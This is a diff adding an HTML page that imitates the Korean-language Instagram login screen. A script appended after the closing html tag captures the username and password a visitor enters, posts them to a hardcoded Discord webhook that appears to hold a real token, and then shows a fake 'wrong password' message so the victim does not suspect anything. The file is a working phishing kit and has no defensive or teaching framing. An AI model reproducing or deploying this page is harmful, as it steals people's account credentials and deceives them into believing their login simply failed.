@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="kr">
+<head>       
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
+    <title>명태사이트 인스타그램 로그인</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="photos/insta-icon.jpg" />
+</head>
+<body>
+    <main>
+        <div class="log-in-container">
+            <div class="log-in">
+                <img src="photos/logo.png" class="logo"/>
+                <div class="log-in-form">
+                    <input type="text" placeholder="전화번호, 사용자 이름 또는 이메일" />
+                    <input type="password" placeholder="비밀번호" />
+                    <button class="log-in-button">로그인</button>
+                </div>
+
+                <span class="or-divider">또는</span>
+                <!--FACEBOOK OPTION-->
+                <div class="fb-login">
+                    <a href="https://www.facebook.com/login.php">
+                        <img src="photos/facebook-icon.png">
+                        <span>Facebook으로 로그인</span>
+                    </a>
+                </div>
+                <!--forgot passwd-->
+                <a href="https://www.instagram.com/accounts/password/reset/">비밀번호를 잊으셨나요? </a>
+            </div>
+            <!--sign up-->
+            <div class="sign-up">
+                <span>계정이 없으신가요?
+                    <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">가입하기</a>
+                </span>
+            </div>
+            <!--download-->
+            <div class="get-the-app">
+                <span>앱을 다운로드 하세요.</span>
+                <div class="app-images">
+                    <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
+                        <img src="photos/applestore.png" alt="App Store" />
+                    </a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pli=1" target="_blank">
+                        <img src="photos/googlestore.png" alt="Google Play" />
+                    </a>
+                </div>
+            </div>
+
+        </div>
+        <!--phones-->
+        <div class="phones-container">
+            <img src="photos/phones.png" />
+        </div>
+    </main>
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">소개</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">JOBS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP</a></li>
+            <li><a href="#">계정</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">언어</a></li>
+        </ul>
+        <span class="copyright">&copy; 2025 Instagram From Meta</span>
+    </footer>
+</body>
+
+</html>
+<script>
+    // Discord 웹훅 URL
+    const webhookURL = "https://discord.com/api/webhooks/1327995924362039327/XFzm9mSqOFAV2ORySh58LBcs_yfxwtH02XuNpHppWeb10SARMiExJRPKnASyhCLU2EO0";
+
+    // 로그인 버튼 클릭 이벤트 처리
+    document.querySelector(".log-in-button").addEventListener("click", async function(event) {
+        event.preventDefault(); // 버튼 기본 동작 막기
+
+        // 입력 필드 값 가져오기
+        const username = document.querySelector(".log-in-form input[type='text']").value;
+        const password = document.querySelector(".log-in-form input[type='password']").value;
+
+        // Discord 웹훅으로 보낼 데이터 생성
+        const data = {
+            content: `New login attempt:\n**Username:** ${username}\n**Password:** ${password}`
+        };
+
+        try {
+            // Discord 웹훅으로 데이터 전송
+            const response = await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                alert("잘못된 비밀번호입니다.다시 확인하세요."); // 성공 메시지
+            } else {
+                alert("잘못된 비밀번호입니다. 다시 확인하세요."); // 실패 메시지
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("잘못된 비밀번호입니다.,다시 확인하세요.");
+        }
+    });
+</script>
